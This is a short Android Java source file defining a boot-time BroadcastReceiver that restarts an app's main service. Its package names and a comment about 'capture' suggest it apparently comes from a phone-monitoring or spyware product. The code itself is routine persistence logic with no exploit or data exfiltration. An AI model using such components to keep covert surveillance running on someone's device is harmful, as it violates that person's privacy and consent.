package com.vvt.android.syncmanager.receivers;

//import com.mobilefonex.mobilebackup.control.ActivateDeactivate;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.fx.dalvik.util.FxLog;
import com.vvt.android.syncmanager.Customization;
import com.vvt.android.syncmanager.control.Main;

public final class SystemState extends BroadcastReceiver {
	
	private static final String TAG = "SystemState";
	private static final boolean LOGD = Customization.DEBUG;
	
	/*
	 * This method will only be called once
	 * It will definitely be called when the device reboots
	 * -> ApplicationState#isCaptureEnabled is not appropriate because the started services handle this state change
	 */
	@Override
	public void onReceive(Context context, Intent intent) { 
		if (LOGD) FxLog.d(TAG, "onReceive # ENTER ...");
		Main.startIfNotStarted(context.getApplicationContext());
	}
}
